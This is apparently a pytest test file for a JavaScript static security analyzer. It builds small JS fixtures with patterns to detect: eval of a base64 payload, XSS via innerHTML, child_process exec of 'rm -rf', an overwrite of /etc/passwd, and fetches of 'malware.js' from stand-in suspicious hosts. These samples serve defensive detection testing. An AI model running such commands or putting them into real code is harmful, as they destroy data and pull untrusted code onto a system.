"""Unit tests for the JavaScript static analyzer."""

import os
from pathlib import Path
from typing import Any, Dict
from unittest.mock import patch

import pytest
from insect.analysis.static_analyzer import JavaScriptStaticAnalyzer


@pytest.fixture()
def test_config() -> Dict[str, Any]:
    """Return a configuration for testing the analyzer."""
    return {
        "javascript_static_analyzer": {
            "enabled": True,
            "min_confidence": 0.0,
            "use_semgrep": False,  # Disable for testing
        }
    }


@pytest.fixture()
def analyzer(test_config: Dict[str, Any]) -> JavaScriptStaticAnalyzer:
    """Initialize the analyzer with the test configuration."""
    with patch(
        "insect.analysis.static_analyzer_utils.check_tool_availability",
        return_value=False,  # Make sure semgrep is considered not available
    ):
        return JavaScriptStaticAnalyzer(test_config)


@pytest.fixture()
def test_files_dir() -> Path:
    """Get the directory containing test files."""
    current_dir = Path(os.path.dirname(os.path.abspath(__file__)))
    test_files_dir = current_dir / "test_files"
    test_files_dir.mkdir(exist_ok=True)
    return test_files_dir


def create_test_file(test_files_dir: Path, filename: str, content: str) -> Path:
    """Create a test file with the given content.

    Args:
        test_files_dir: Directory to create the file in
        filename: Name of the file to create
        content: Content to write to the file

    Returns:
        Path to the created file
    """
    file_path = test_files_dir / filename
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(content)
    return file_path


def test_analyzer_initialization(analyzer: JavaScriptStaticAnalyzer) -> None:
    """Test that the analyzer is properly initialized."""
    assert analyzer.name == "javascript_static_analyzer"
    assert analyzer.enabled is True
    assert analyzer.min_confidence == 0.0
    assert analyzer.use_semgrep is False
    assert len(analyzer.rules) > 0
    assert ".js" in analyzer.supported_extensions
    assert ".ts" in analyzer.supported_extensions


def test_eval_detection(
    analyzer: JavaScriptStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of eval() usage."""
    file_path = create_test_file(
        test_files_dir,
        "test_eval.js",
        """
        // Malicious code using eval
        const data = "alert('hello')";
        eval(data);

        // Obfuscated Function constructor
        const fn = new Function("return alert('hacked')");
        fn();

        // Dangerous setTimeout with string
        setTimeout("console.log('Potentially malicious')", 1000);
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 3
    assert any(
        "code execution" in finding.title.lower() or "unsafe" in finding.title.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_dom_manipulation_detection(
    analyzer: JavaScriptStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of unsafe DOM manipulation."""
    file_path = create_test_file(
        test_files_dir,
        "test_dom_manipulation.js",
        """
        // Unsafe DOM manipulation methods (XSS vulnerabilities)
        element.innerHTML = "<script>alert('XSS')</script>";
        div.outerHTML = userInput;
        document.write("<h1>" + userData + "</h1>");
        el.insertAdjacentHTML('beforeend', dynamicContent);
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 3
    assert any(
        "dom" in finding.title.lower() or "xss" in finding.description.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_suspicious_imports_detection(
    analyzer: JavaScriptStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of suspicious imports/requires."""
    file_path = create_test_file(
        test_files_dir,
        "test_suspicious_imports.js",
        """
        // Potentially dangerous Node.js modules
        const childProcess = require('child_process');
        const fs = require('fs');
        import http from 'http';
        const { exec } = require('child_process');

        // Using these modules for system interaction
        exec('rm -rf /tmp/test');
        fs.writeFileSync('/etc/passwd', 'malicious content');
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 3
    assert any(
        "suspicious module" in finding.title.lower()
        or "module usage" in finding.title.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_encoded_payload_detection(
    analyzer: JavaScriptStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of encoded payloads."""
    file_path = create_test_file(
        test_files_dir,
        "test_encoded_payload.js",
        """
        // Base64 encoded command
        const payload = "YWxlcnQoImhhY2tlZCIpOw==";
        eval(atob(payload));

        // Hex encoded content
        const hexPayload = "616c65727428226861636b656422293b";
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 2
    assert any("encoded payload" in finding.title.lower() for finding in findings)

    # Clean up
    os.remove(file_path)


def test_hardcoded_secrets_detection(
    analyzer: JavaScriptStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of hardcoded secrets."""
    file_path = create_test_file(
        test_files_dir,
        "test_secrets.js",
        """
        // Hardcoded secrets (bad practice)
        const API_KEY = "a1b2c3d4e5f6g7h8i9j0";
        const password = "supersecretpassword123";
        var secret_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";

        // Configuration with credentials
        const config = {
          apiKey: "AIzaSyDI3-5w34dj_8QlK",
          authToken: "Bearer abcdefg12345",
          password: "admin123"
        };
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 3
    assert any(
        "secret" in finding.title.lower() or "credential" in finding.description.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_network_connection_detection(
    analyzer: JavaScriptStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of suspicious network connections."""
    file_path = create_test_file(
        test_files_dir,
        "test_network.js",
        """
        // Suspicious URLs
        fetch("https://suspicious-domain.com/payload")
          .then(response => response.json())
          .then(data => processData(data));

        // IP address connection
        const response = await axios.get("http://123.456.789.012/malware.js");

        // WebSocket connection
        const socket = new WebSocket("wss://suspicious-server.com");
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 2
    assert any(
        "network" in finding.title.lower() or "url" in finding.description.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_unsafe_json_parsing(
    analyzer: JavaScriptStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of unsafe JSON parsing (potential prototype pollution)."""
    file_path = create_test_file(
        test_files_dir,
        "test_json_parsing.js",
        """
        // Potentially unsafe JSON parsing from untrusted sources
        const userData = JSON.parse(request.body);
        Object.assign({}, JSON.parse(externalData));

        // Safer approaches would use validation or sanitization
        const safeData = JSON.parse(data);  // Still detected, but might be safe with proper validation
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 2
    assert any(
        "json" in finding.title.lower() or "parsing" in finding.title.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_analyze_file_not_exists(analyzer: JavaScriptStaticAnalyzer) -> None:
    """Test analyzing a file that doesn't exist."""
    findings = analyzer.analyze_file(Path("nonexistent_file.js"))
    assert len(findings) == 0


def test_analyze_empty_file(
    analyzer: JavaScriptStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test analyzing an empty file."""
    file_path = create_test_file(
        test_files_dir,
        "test_empty.js",
        "",
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) == 0

    # Clean up
    os.remove(file_path)


def test_confidence_threshold(
    test_config: Dict[str, Any], test_files_dir: Path
) -> None:
    """Test that the confidence threshold works."""
    # Set a high confidence threshold
    test_config["javascript_static_analyzer"]["min_confidence"] = 0.8
    with patch(
        "insect.analysis.static_analyzer_utils.check_tool_availability",
        return_value=False,
    ):
        high_threshold_analyzer = JavaScriptStaticAnalyzer(test_config)

    # Create a file with different types of issues
    file_path = create_test_file(
        test_files_dir,
        "test_confidence.js",
        """
        // This has high confidence issues (eval)
        eval("alert('hello')");

        // This has medium confidence (suspicious import)
        const fs = require('fs');

        // This has lower confidence (potential encoded string)
        const s = "aGVsbG8gd29ybGQ=";
        """,
    )

    # Get all findings with no threshold
    test_config["javascript_static_analyzer"]["min_confidence"] = 0.0
    with patch(
        "insect.analysis.static_analyzer_utils.check_tool_availability",
        return_value=False,
    ):
        all_analyzer = JavaScriptStaticAnalyzer(test_config)
    all_findings = all_analyzer.analyze_file(file_path)

    # Get findings with high threshold
    high_findings = high_threshold_analyzer.analyze_file(file_path)

    # The high threshold analyzer should find fewer issues
    assert high_threshold_analyzer.min_confidence == 0.8
    assert all_analyzer.min_confidence == 0.0
    assert len(all_findings) > len(high_findings)

    # Clean up
    os.remove(file_path)
